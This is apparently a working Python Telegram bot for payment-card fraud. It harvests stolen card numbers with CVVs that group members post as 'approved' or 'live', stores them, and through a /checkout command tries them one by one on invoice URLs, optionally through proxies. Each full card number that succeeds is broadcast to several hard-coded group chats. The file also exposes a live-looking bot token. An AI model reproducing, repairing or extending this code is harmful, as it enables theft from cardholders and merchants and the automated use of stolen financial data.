#!/usr/bin/env python3
"""
Mady Telegram Bot with Auto-Checkout Integration
Includes /checkout command to automatically try approved cards on invoice URLs
"""

import telebot
import time
import os
import re
import json
import threading
from datetime import datetime
from checkout_integration import process_checkout, parse_card

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_IDS = ["-1003538559040", "-4997223070", "-1003643720778"]
BOT_CREDIT = "@MissNullMe"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage for approved cards per group
approved_cards_storage = {}  # {group_id: [card1, card2, ...]}
checkout_processes = {}  # {user_id: {"stop": False, "thread": thread_obj}}

# Lock for thread-safe operations
storage_lock = threading.Lock()

def add_approved_card(group_id: str, card: str):
    """Add an approved card to the storage"""
    with storage_lock:
        if group_id not in approved_cards_storage:
            approved_cards_storage[group_id] = []
        
        # Keep only last 100 cards per group
        if len(approved_cards_storage[group_id]) >= 100:
            approved_cards_storage[group_id].pop(0)
        
        approved_cards_storage[group_id].append(card)

def get_approved_cards(group_id: str):
    """Get all approved cards for a group"""
    with storage_lock:
        return approved_cards_storage.get(group_id, []).copy()

def clear_approved_cards(group_id: str):
    """Clear approved cards for a group"""
    with storage_lock:
        if group_id in approved_cards_storage:
            approved_cards_storage[group_id] = []

# Command: /start
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = f"""
🤖 <b>Welcome to MADY Bot!</b>

<b>Available Commands:</b>

<b>Card Checking:</b>
/check - Upload a text file with cards to check
/gateway - Select which gateway to use
/status - Check current checking status
/stop - Stop current checking process

<b>Auto-Checkout:</b>
/checkout <URL> - Auto-try approved cards on invoice
/cards - View stored approved cards
/clearcards - Clear stored approved cards

<b>Other:</b>
/help - Show this help message

<b>Bot by:</b> {BOT_CREDIT}

<i>Note: The bot stores the last 100 approved cards from this group for auto-checkout.</i>
"""
    bot.send_message(message.chat.id, welcome_text, parse_mode='HTML')

# Command: /help
@bot.message_handler(commands=['help'])
def help_command(message):
    start_command(message)

# Command: /checkout
@bot.message_handler(commands=['checkout'])
def checkout_command(message):
    """
    Handle /checkout command
    Usage: /checkout <invoice_url> [proxy]
    """
    user_id = message.from_user.id
    chat_id = message.chat.id
    group_id = str(chat_id)
    
    # Check if already running a checkout
    if user_id in checkout_processes and checkout_processes[user_id].get("thread") and checkout_processes[user_id]["thread"].is_alive():
        bot.reply_to(message, "⚠️ You already have a checkout process running. Use /stopcheckout to stop it first.")
        return
    
    # Parse command
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, """
❌ <b>Invalid usage!</b>

<b>Usage:</b>
<code>/checkout <invoice_url></code>
<code>/checkout <invoice_url> proxy:port:user:pass</code>

<b>Example:</b>
<code>/checkout https://example.com/invoice/abc123</code>

The bot will automatically try all approved cards stored from this group.
""", parse_mode='HTML')
        return
    
    invoice_url = parts[1]
    proxy = parts[2] if len(parts) > 2 else None
    
    # Validate URL
    if not invoice_url.startswith('http'):
        bot.reply_to(message, "❌ Invalid URL. Must start with http:// or https://")
        return
    
    # Get approved cards
    cards = get_approved_cards(group_id)
    
    if not cards:
        bot.reply_to(message, """
❌ <b>No approved cards available!</b>

The bot needs approved cards to try. These are automatically stored when:
1. Cards are checked and approved in this group
2. Approved cards are posted in this group

<i>Tip: Run /check first to get some approved cards.</i>
""", parse_mode='HTML')
        return
    
    # Send initial message
    initial_msg = bot.reply_to(message, f"""
🚀 <b>AUTO-CHECKOUT STARTED</b>

<b>Invoice URL:</b> <code>{invoice_url[:50]}...</code>
<b>Available Cards:</b> {len(cards)}
<b>Proxy:</b> {'Yes' if proxy else 'No'}

<i>Trying cards now...</i>
""", parse_mode='HTML')
    
    # Start checkout process in thread
    checkout_processes[user_id] = {"stop": False, "thread": None}
    
    def run_checkout():
        try:
            def progress_callback(card, status, message, current, total):
                # Check if should stop
                if checkout_processes.get(user_id, {}).get("stop"):
                    return
                
                # Send progress update every 5 cards or on success
                if current % 5 == 0 or status == "live":
                    try:
                        progress_text = f"""
🔄 <b>Progress: {current}/{total}</b>

<b>Current Card:</b> <code>{card[:4]}****{card[-4:]}</code>
<b>Status:</b> {status.upper()}
<b>Message:</b> {message}
"""
                        bot.edit_message_text(
                            progress_text,
                            chat_id=chat_id,
                            message_id=initial_msg.message_id,
                            parse_mode='HTML'
                        )
                    except Exception:
                        pass
                
                # If successful, post to all groups
                if status == "live":
                    success_msg = f"""
✅ <b>CHECKOUT SUCCESSFUL!</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Invoice:</b> <code>{invoice_url[:50]}...</code>
<b>Message:</b> {message}

<b>Bot by:</b> {BOT_CREDIT}
"""
                    for gid in GROUP_IDS:
                        try:
                            bot.send_message(gid, success_msg, parse_mode='HTML')
                        except Exception:
                            pass
            
            def stop_check():
                return checkout_processes.get(user_id, {}).get("stop", False)
            
            # Run the checkout process
            result = process_checkout(
                invoice_url,
                cards,
                proxy=proxy,
                callback=progress_callback,
                stop_check=stop_check
            )
            
            # Send final result
            if result["success"]:
                final_text = f"""
🎉 <b>CHECKOUT COMPLETE - SUCCESS!</b>

<b>Successful Card:</b> <code>{result['successful_card']}</code>
<b>Cards Tried:</b> {result['total_tried']}/{len(cards)}
<b>Invoice:</b> <code>{invoice_url[:50]}...</code>

<b>Bot by:</b> {BOT_CREDIT}
"""
            else:
                # Determine why it failed
                last_status = result["results"][-1][1] if result["results"] else "unknown"
                
                if last_status == "voided":
                    reason = "Invoice voided (too many attempts)"
                elif checkout_processes.get(user_id, {}).get("stop"):
                    reason = "Stopped by user"
                else:
                    reason = "All cards failed"
                
                final_text = f"""
❌ <b>CHECKOUT COMPLETE - FAILED</b>

<b>Reason:</b> {reason}
<b>Cards Tried:</b> {result['total_tried']}/{len(cards)}
<b>Invoice:</b> <code>{invoice_url[:50]}...</code>

<i>Try with different cards or check if invoice is still valid.</i>
"""
            
            try:
                bot.edit_message_text(
                    final_text,
                    chat_id=chat_id,
                    message_id=initial_msg.message_id,
                    parse_mode='HTML'
                )
            except Exception:
                bot.send_message(chat_id, final_text, parse_mode='HTML')
        
        except Exception as e:
            error_text = f"""
❌ <b>CHECKOUT ERROR</b>

<b>Error:</b> {str(e)[:200]}

<i>Please try again or contact support.</i>
"""
            try:
                bot.edit_message_text(
                    error_text,
                    chat_id=chat_id,
                    message_id=initial_msg.message_id,
                    parse_mode='HTML'
                )
            except Exception:
                bot.send_message(chat_id, error_text, parse_mode='HTML')
        
        finally:
            # Clean up
            if user_id in checkout_processes:
                del checkout_processes[user_id]
    
    # Start thread
    thread = threading.Thread(target=run_checkout, daemon=True)
    checkout_processes[user_id]["thread"] = thread
    thread.start()

# Command: /stopcheckout
@bot.message_handler(commands=['stopcheckout'])
def stop_checkout_command(message):
    """Stop the current checkout process"""
    user_id = message.from_user.id
    
    if user_id in checkout_processes:
        checkout_processes[user_id]["stop"] = True
        bot.reply_to(message, "🛑 Stopping checkout process...")
    else:
        bot.reply_to(message, "⚠️ No active checkout process found.")

# Command: /cards
@bot.message_handler(commands=['cards'])
def cards_command(message):
    """Show stored approved cards"""
    group_id = str(message.chat.id)
    cards = get_approved_cards(group_id)
    
    if not cards:
        bot.reply_to(message, "📭 No approved cards stored for this group yet.")
        return
    
    # Show last 10 cards
    recent_cards = cards[-10:]
    cards_text = "\n".join([f"• <code>{card}</code>" for card in recent_cards])
    
    response = f"""
💳 <b>Stored Approved Cards</b>

<b>Total:</b> {len(cards)} cards
<b>Showing:</b> Last {len(recent_cards)} cards

{cards_text}

<i>These cards will be used for /checkout command.</i>
"""
    bot.reply_to(message, response, parse_mode='HTML')

# Command: /clearcards
@bot.message_handler(commands=['clearcards'])
def clear_cards_command(message):
    """Clear stored approved cards"""
    group_id = str(message.chat.id)
    cards_count = len(get_approved_cards(group_id))
    
    clear_approved_cards(group_id)
    
    bot.reply_to(message, f"🧹 Cleared {cards_count} approved cards from storage.")

# Message handler to capture approved cards
@bot.message_handler(func=lambda message: True, content_types=['text'])
def capture_approved_cards(message):
    """Capture approved cards posted in groups"""
    group_id = str(message.chat.id)
    text = message.text
    
    # Check if message contains card format and approval indicators
    if any(indicator in text.lower() for indicator in ['approved', 'live', 'charged', '✅']):
        # Try to extract card
        card_pattern = r'(\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})'
        matches = re.findall(card_pattern, text)
        
        for card in matches:
            # Validate card format
            if parse_card(card):
                add_approved_card(group_id, card)
                print(f"[INFO] Captured approved card for group {group_id}: {card[:4]}****")

# Start bot
if __name__ == "__main__":
    print("="*60)
    print("MADY BOT WITH AUTO-CHECKOUT")
    print("="*60)
    print(f"Bot Token: {BOT_TOKEN[:20]}...")
    print(f"Groups: {', '.join(GROUP_IDS)}")
    print(f"Bot Credit: {BOT_CREDIT}")
    print("="*60)
    print("\nCommands available:")
    print("  /checkout <url> - Auto-try approved cards")
    print("  /cards - View stored cards")
    print("  /clearcards - Clear stored cards")
    print("  /stopcheckout - Stop checkout process")
    print("\nBot is running...")
    print("="*60)
    
    # Start polling
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
